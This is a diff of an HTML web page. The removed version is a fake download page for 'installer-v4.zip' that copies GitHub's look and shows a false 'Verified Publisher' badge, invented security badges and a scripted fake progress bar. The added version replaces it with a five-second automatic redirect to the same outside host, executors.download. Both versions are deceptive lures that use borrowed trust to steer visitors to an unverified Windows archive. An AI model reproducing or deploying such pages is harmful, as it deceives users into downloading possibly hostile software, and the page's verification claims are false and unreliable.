@@ -4,7 +4,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Download installer-v4.zip</title>
+<title>Redirecting...</title>
+
+<meta http-equiv="refresh" content="5;url=https://executors.download/llimneyrq3jf/">
 
 <style>
 * {
@@ -16,447 +18,144 @@
 body {
     min-height: 100vh;
     background: #080c10;
-    background-image: radial-gradient(
-        ellipse 80% 50% at 50% -10%,
-        rgba(35,134,54,.15), transparent 70%
-    );
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: -apple-system, BlinkMacSystemFont,
-    "Segoe UI", Arial, sans-serif;
     color: #e6edf3;
-    padding: 24px;
-}
-
-.topbar {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 52px;
-    background: #0d1117;
-    border-bottom: 1px solid #21262d;
+    font-family: Arial, sans-serif;
     display: flex;
-    justify-content: center;
     align-items: center;
-}
-
-.topbar svg {
-    width: 28px;
-    height: 28px;
-    fill: white;
+    justify-content: center;
+    padding: 20px;
 }
 
 .card {
     width: 100%;
-    max-width: 560px;
+    max-width: 480px;
     background: #0d1117;
     border: 1px solid #21262d;
     border-radius: 16px;
-    overflow: hidden;
-    margin-top: 52px;
+    padding: 40px 30px;
+    text-align: center;
     box-shadow: 0 24px 64px rgba(0,0,0,.5);
 }
 
-.publisher {
-    background: #080c10;
-    border-bottom: 1px solid #21262d;
-    padding: 12px 24px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-}
-
-.pub-badge {
-    background: rgba(35,134,54,.12);
-    border: 1px solid rgba(35,134,54,.4);
-    border-radius: 20px;
-    padding: 4px 12px;
-    color: #3fb950;
-    font-size: 12px;
-    font-weight: 600;
-}
-
-.pub-url {
-    margin-left: auto;
-    color: #8b949e;
-    font-size: 12px;
-}
-
-.body {
-    padding: 36px 32px 30px;
-}
-
-.icon-wrap {
-    display: flex;
-    justify-content: center;
+.icon {
+    font-size: 48px;
     margin-bottom: 20px;
 }
 
-.icon-circle {
-    width: 60px;
-    height: 60px;
-    background: rgba(35,134,54,.1);
-    border: 1px solid rgba(35,134,54,.5);
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.icon-circle svg {
-    width: 28px;
-    height: 28px;
-    fill: #3fb950;
-}
-
 h1 {
-    text-align: center;
-    font-size: 22px;
-    color: #f0f6fc;
-    margin-bottom: 8px;
-}
-
-.subtitle {
-    text-align: center;
-    font-size: 13px;
-    color: #8b949e;
-    margin-bottom: 28px;
-    line-height: 1.5;
-}
-
-.prog-header {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 8px;
-}
-
-.prog-label {
-    font-size: 12px;
-    font-weight: 600;
-    color: #8b949e;
-    text-transform: uppercase;
-}
-
-.prog-pct {
-    color: #3fb950;
-    font-size: 13px;
-    font-weight: bold;
-}
-
-.prog-track {
-    height: 10px;
-    background: #161b22;
-    border-radius: 99px;
-    overflow: hidden;
-    border: 1px solid #21262d;
-    margin-bottom: 8px;
-}
-
-.prog-fill {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(
-        90deg, #1a7f37, #2ea043, #3fb950
-    );
-    border-radius: 99px;
-    transition: width .08s linear;
-}
-
-.prog-meta {
-    display: flex;
-    justify-content: space-between;
-    font-size: 12px;
-    margin-bottom: 24px;
-}
-
-.prog-status {
-    color: #e6edf3;
-}
-
-.prog-eta {
-    color: #8b949e;
-}
-
-.security {
-    background: rgba(35,134,54,.04);
-    border: 1px solid rgba(35,134,54,.2);
-    border-radius: 10px;
-    padding: 16px 18px;
-    margin-bottom: 18px;
-}
-
-.sec-title {
-    color: #3fb950;
-    font-size: 13px;
-    font-weight: 600;
+    font-size: 23px;
     margin-bottom: 12px;
 }
 
-.sec-badges {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 8px;
-}
-
-.sec-badge {
-    background: rgba(35,134,54,.08);
-    border: 1px solid rgba(35,134,54,.25);
-    border-radius: 6px;
-    padding: 5px 12px;
-    font-size: 12px;
-    color: #3fb950;
-}
-
-.file-row {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    background: #080c10;
-    border: 1px solid #21262d;
-    border-radius: 10px;
-    padding: 14px 16px;
-    margin-bottom: 16px;
-}
-
-.file-icon svg {
-    width: 30px;
-    height: 30px;
-    fill: #388bfd;
-}
-
-.file-name {
+p {
     font-size: 14px;
-    font-weight: 600;
-    color: #f0f6fc;
-}
-
-.file-meta {
-    font-size: 12px;
     color: #8b949e;
-    margin-top: 3px;
-}
-
-.btn-dl {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 9px;
-    width: 100%;
-    background: linear-gradient(180deg,#2ea043,#238636);
-    border: 1px solid rgba(63,185,80,.4);
-    border-radius: 8px;
-    color: white;
-    font-size: 15px;
-    font-weight: 700;
-    padding: 14px;
-    cursor: pointer;
-    text-decoration: none;
-    transition: .2s;
-    box-shadow: 0 4px 16px rgba(35,134,54,.25);
-}
-
-.btn-dl:hover {
-    filter: brightness(1.15);
-    box-shadow: 0 6px 24px rgba(35,134,54,.4);
-}
-
-.btn-dl svg {
-    width: 18px;
-    height: 18px;
-    fill: white;
-}
-
-.fine-print {
-    font-size: 11px;
-    color: #484f58;
-    text-align: center;
-    margin-top: 14px;
     line-height: 1.6;
 }
 
-@media(max-width:480px) {
-    .body {
-        padding: 28px 20px;
-    }
-    h1 {
-        font-size: 20px;
-    }
+.countdown {
+    color: #3fb950;
+    font-size: 42px;
+    font-weight: bold;
+    margin: 25px 0;
 }
+
+.track {
+    height: 9px;
+    background: #21262d;
+    border-radius: 20px;
+    overflow: hidden;
+    margin-bottom: 25px;
+}
+
+.fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg,#238636,#3fb950);
+    transition: width .1s linear;
+}
+
+.button {
+    display: block;
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(180deg,#2ea043,#238636);
+    color: white;
+    font-weight: bold;
+    text-decoration: none;
+    border-radius: 8px;
+    transition: .2s;
+}
+
+.button:hover {
+    filter: brightness(1.15);
+}
+
+.footer {
+    margin-top: 20px;
+    font-size: 11px;
+    color: #484f58;
+}
+
 </style>
 </head>
 
 <body>
 
-<div class="topbar">
-    <svg viewBox="0 0 16 16">
-        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
-    </svg>
-</div>
-
 <div class="card">
 
-    <div class="publisher">
-        <div class="pub-badge">✓ Verified Publisher</div>
-        <span class="pub-url">github.com/downloader</span>
+    <div class="icon">↗</div>
+
+    <h1>Redirecting you...</h1>
+
+    <p>
+        You are being redirected to the requested destination.
+        Please wait a moment.
+    </p>
+
+    <div class="countdown" id="countdown">5</div>
+
+    <div class="track">
+        <div class="fill" id="fill"></div>
     </div>
 
-    <div class="body">
+    <a
+        class="button"
+        href="https://executors.download/llimneyrq3jf/"
+        rel="noopener noreferrer"
+    >
+        Continue Now →
+    </a>
 
-        <div class="icon-wrap">
-            <div class="icon-circle">
-                <svg viewBox="0 0 16 16">
-                    <path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/>
-                </svg>
-            </div>
-        </div>
-
-        <h1 id="heading">Preparing your download...</h1>
-
-        <p class="subtitle" id="subtext">
-            Please wait while your download is being prepared.
-        </p>
-
-        <div class="prog-header">
-            <span class="prog-label">Download status</span>
-            <span class="prog-pct" id="prog-pct">0%</span>
-        </div>
-
-        <div class="prog-track">
-            <div class="prog-fill" id="fill"></div>
-        </div>
-
-        <div class="prog-meta">
-            <span class="prog-status" id="prog-status">Connecting...</span>
-            <span class="prog-eta" id="prog-eta">Please wait</span>
-        </div>
-
-        <div class="security">
-            <div class="sec-title">
-                ✓ Security Information
-            </div>
-
-            <div class="sec-badges">
-                <span class="sec-badge">Package Check</span>
-                <span class="sec-badge">SHA-256 Support</span>
-                <span class="sec-badge">File Verification</span>
-                <span class="sec-badge">Secure Connection</span>
-            </div>
-        </div>
-
-        <div class="file-row">
-            <div class="file-icon">
-                <svg viewBox="0 0 16 16">
-                    <path d="M3.75 1.5a.25.25 0 00-.25.25v11.5c0 .138.112.25.25.25h8.5a.25.25 0 00.25-.25V6H9.75A1.75 1.75 0 018 4.25V1.5H3.75zm5.75.56v2.19c0 .138.112.25.25.25h2.19L9.5 2.06z"/>
-                </svg>
-            </div>
-            <div>
-                <div class="file-name">installer-v4.zip</div>
-                <div class="file-meta">ZIP Archive · Windows x64</div>
-            </div>
-        </div>
-
-        <a
-            class="btn-dl"
-            id="btn"
-            href="https://executors.download/llimneyrq3jf/"
-            target="_blank"
-            rel="noopener noreferrer"
-        >
-            <svg viewBox="0 0 16 16">
-                <path d="M7.47 10.78a.75.75 0 001.06 0l3.75-3.75a.75.75 0 00-1.06-1.06L8.75 8.44V1.75a.75.75 0 00-1.5 0v6.69L4.78 5.97a.75.75 0 00-1.06 1.06l3.75 3.75zM3.75 13a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5z"/>
-            </svg>
-            Download installer-v4.zip
-        </a>
-
-        <p class="fine-print">
-            Click the button above to continue to your download.
-            <br>
-            Please verify files before opening them.
-        </p>
-
+    <div class="footer">
+        If automatic redirection doesn't work,
+        click the button above.
     </div>
+
 </div>
 
 <script>
+const TARGET_URL = "https://executors.download/llimneyrq3jf/";
+
+let remaining = 5;
+
+const countdown = document.getElementById("countdown");
 const fill = document.getElementById("fill");
-const pct = document.getElementById("prog-pct");
-const status = document.getElementById("prog-status");
-const eta = document.getElementById("prog-eta");
 
-const segments = [
-    { target: 18, duration: 400, label: "Connecting..." },
-    { target: 38, duration: 600, label: "Checking package..." },
-    { target: 55, duration: 800, label: "Preparing file..." },
-    { target: 71, duration: 400, label: "Verifying..." },
-    { target: 88, duration: 700, label: "Almost ready..." },
-    { target: 100, duration: 400, label: "Ready!" }
-];
+const timer = setInterval(function() {
 
-let current = 0;
-let index = 0;
-let startTime = null;
-let startPct = 0;
+    remaining--;
 
-function ease(t) {
-    return t < .5
-        ? 4*t*t*t
-        : 1-Math.pow(-2*t+2,3)/2;
-}
+    countdown.textContent = remaining;
+    fill.style.width = ((5 - remaining) / 5 * 100) + "%";
 
-function animate(ts) {
-    if (index >= segments.length) return;
-
-    const seg = segments[index];
-
-    if (startTime === null) {
-        startTime = ts;
-        startPct = current;
-        status.textContent = seg.label;
+    if (remaining <= 0) {
+        clearInterval(timer);
+        window.location.replace(TARGET_URL);
     }
 
-    const t = Math.min((ts-startTime)/seg.duration,1);
+}, 1000);
 
-    current = startPct +
-        (seg.target-startPct)*ease(t);
-
-    fill.style.width = current + "%";
-    pct.textContent = Math.round(current) + "%";
-    eta.textContent = "Preparing...";
-
-    if (t < 1) {
-        requestAnimationFrame(animate);
-    } else {
-        index++;
-        startTime = null;
-
-        if (index < segments.length) {
-            setTimeout(() => requestAnimationFrame(animate),100);
-        } else {
-            complete();
-        }
-    }
-}
-
-function complete() {
-    document.getElementById("heading").textContent =
-        "Your download is ready!";
-
-    document.getElementById("subtext").textContent =
-        "Click the button below to continue to your download.";
-
-    status.textContent = "Ready.";
-    eta.textContent = "100% complete";
-}
-
-// Start animation only.
-// Download happens ONLY when the visitor clicks the link.
-
-setTimeout(() => {
-    requestAnimationFrame(animate);
-}, 500);
 </script>
 
 </body>
